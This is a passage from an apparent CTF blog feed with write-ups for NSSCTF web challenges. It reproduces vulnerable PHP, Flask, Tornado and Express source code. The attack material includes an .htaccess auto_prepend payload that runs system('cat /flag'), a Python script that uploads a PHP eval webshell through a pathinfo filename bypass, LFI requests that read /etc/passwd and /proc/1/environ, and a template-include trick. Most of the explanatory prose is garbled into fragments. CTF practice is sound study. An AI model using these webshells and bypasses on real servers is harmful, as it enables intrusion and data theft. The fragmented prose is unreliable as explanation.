keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nHello, world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>contentfilename<code>onhtmltypeflaguploadfile</code><br><code>file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code><br>helloworld<br></p><blockquote><p><code>php_value auto_prepend_fil\ e .htaccess #&lt;?php system(&#39;cat /fla?);?&gt;\ </code></p></blockquote><p>php_value auto_prepend_filefile<code>fil\%0Ae</code><code>#</code>**.htaccess**<code>\</code></p><blockquote><p>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /fla'.'g');?>\hellowprld<br><br>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /fla?');?><br>helloworld<br>500.</p></blockquote><p><img src="https://img-blog.csdnimg.cn/cb25147337d94147ba512a0d14fbc9dd.png" alt="5"></p><p><br><a href="https://www.cxyzjd.com/article/Zero_Adam/116808755">2020 easyphp  python.htaccess  preg_match_Zero_Adam-</a></p><p><a href="https://xz.aliyun.com/t/8267#toc-0">Apache.htaccess</a></p>]]></content>
      
      
      <categories>
          
          <category> nssctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nssctf2ndweb</title>
      <link href="/2023/09/02/nssctf2ndweb/"/>
      <url>/2023/09/02/nssctf2ndweb/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="NSSCTF-2nd-php"><a href="#NSSCTF-2nd-php" class="headerlink" title="[NSSCTF 2nd]php"></a>[NSSCTF 2nd]php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_list</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please re-upload"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>pathinfo</strong><a href="https://blog.zsxsoft.com/post/36">pathinfo</a><code>pathinfo($filename, PATHINFO_EXTENSION)</code><code>.</code><code>.</code>index.php&#x2F;.pathinfo<code>1.php/.</code><code>pathinfo</code>NULL<code>/.</code>url<br>burppython</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">upload_content_with_filename</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> content<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    upload_url <span class="token operator">=</span> <span class="token string">'http://node5.anna.nssctf.cn:28154/'</span>  <span class="token comment"># URL</span>    content_to_upload <span class="token operator">=</span> <span class="token string">"&lt;?php @eval($_POST[1]); phpinfo(); ?>"</span>  <span class="token comment"># </span>    filename_to_upload <span class="token operator">=</span> <span class="token string">"123.php%2F."</span>  <span class="token comment"># </span>    response <span class="token operator">=</span> upload_content_with_filename<span class="token punctuation">(</span>upload_url<span class="token punctuation">,</span> content_to_upload<span class="token punctuation">,</span> filename_to_upload<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag<br><img src="https://img-blog.csdnimg.cn/e45ecf02df5f46b7bd9e79579b429f1b.png" alt="1"></p><h3 id="NSSCTF-2nd-MyBox"><a href="#NSSCTF-2nd-MyBox" class="headerlink" title="[NSSCTF 2nd]MyBox"></a>[NSSCTF 2nd]MyBox</h3><p><a href="http://node5.anna.nssctf.cn:28756/?url=dosth">http://node5.anna.nssctf.cn:28756/?url=dosth</a><br>LFIfile:&#x2F;&#x2F;<br><a href="http://node5.anna.nssctf.cn:28756/?url=file:///etc/passwd%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96">http://node5.anna.nssctf.cn:28756/?url=file:///etc/passwd</a><br><img src="https://img-blog.csdnimg.cn/1fb22c00512948079f0e1969a2b48236.png" alt="2"><br><code>app/app.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token keyword">import</span> requests<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> struct<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/?url=dosth'</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'file://'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>url<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'http://localhost/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">elif</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'mybox://127.0.0.1:'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        port<span class="token punctuation">,</span> content <span class="token operator">=</span> url<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/_'</span><span class="token punctuation">,</span> maxsplit<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token string">b''</span>        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> data<span class="token punctuation">:</span>                res <span class="token operator">+=</span> data            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">return</span> res    <span class="token keyword">return</span> <span class="token string">''</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">827</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br><code>view-source:http://node5.anna.nssctf.cn:28756/?url=file:///proc/1/environ</code><br><img src="https://img-blog.csdnimg.cn/67f10ba64ae2427f86015bf9692890c1.png" alt="3"></p><h3 id="NSSCTF-2nd-MyHurricane"><a href="#NSSCTF-2nd-MyHurricane" class="headerlink" title="[NSSCTF 2nd]MyHurricane"></a>[NSSCTF 2nd]MyHurricane</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>ioloop<span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web<span class="token keyword">import</span> osBASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    bl <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'not'</span><span class="token punctuation">,</span> <span class="token string">'&#123;&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;&#125;'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> bl<span class="token punctuation">:</span>        <span class="token keyword">if</span> c <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> chunk <span class="token keyword">in</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> chunk<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">31</span> <span class="token operator">&lt;</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">class</span> <span class="token class-name">IndexHandler</span><span class="token punctuation">(</span>tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">"ssti"</span><span class="token punctuation">)</span><span class="token comment">#POSTssti</span>        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.html'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"""&lt;html>                        &lt;head>&lt;/head>                        &lt;body style="font-size: 30px;"></span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/body>&lt;/html>                        """</span></span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'1.html'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span><span class="token string">'no no no'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>Application<span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token punctuation">(</span><span class="token string">r"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span> compiled_template_cache<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">827</span><span class="token punctuation">)</span>    tornado<span class="token punctuation">.</span>ioloop<span class="token punctuation">.</span>IOLoop<span class="token punctuation">.</span>current<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>tornado</strong><br><code>&#123;% include /proc/1/environ %&#125;</code>.<br><img src="https://img-blog.csdnimg.cn/a093653f8c384dafaf5510233312477b.png" alt="4"></p><h3 id="NSSCTF-2nd-MyJs"><a href="#NSSCTF-2nd-MyJs" class="headerlink" title="[NSSCTF 2nd]MyJs"></a>[NSSCTF 2nd]MyJs</h3><blockquote><p>jwt+ejs</p></blockquote><p></p><p><code>/source</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> lodash <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> randomize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'randomatic'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> <span class="token string">'./views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'session'</span><span class="token punctuation">,</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token function">randomize</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>__filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 